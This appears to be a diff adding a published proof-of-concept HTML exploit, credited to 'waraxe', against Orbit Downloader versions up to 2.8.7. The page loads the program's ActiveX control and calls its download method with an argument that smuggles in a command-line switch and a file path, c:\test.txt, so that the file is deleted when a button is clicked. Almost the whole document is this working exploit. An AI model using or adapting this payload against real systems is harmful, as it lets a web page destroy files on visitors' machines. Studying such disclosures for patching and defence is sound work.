@@ -1,0 +1,17 @@
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;Orbit Downloader &amp;lt;= 2.8.7 Arbitrary File Deletion PoC by waraxe&lt;/title&gt;
+&lt;script&gt;
+function test()
+{
+	waraxe.download(&#039;&#039;,&#039;&#039;,&#039;&quot; /Lc:\\test.txt &quot;&#039;,&#039;&#039;,1);
+}
+&lt;/script&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;object
+id=&quot;waraxe&quot; name=&quot;waraxe&quot;
+classid=&quot;CLSID:3F1D494B-0CEF-4468-96C9-386E2E4DEC90&quot;
+width=&quot;50&quot; height=&quot;50&quot;&gt;
+&lt;/object&gt;
+&lt;br&gt;&lt;center&gt;
+&lt;button onclick=&quot;javascript:test();&quot;&gt;  Test  &lt;/button&gt;
+&lt;/body&gt;&lt;/html&gt;
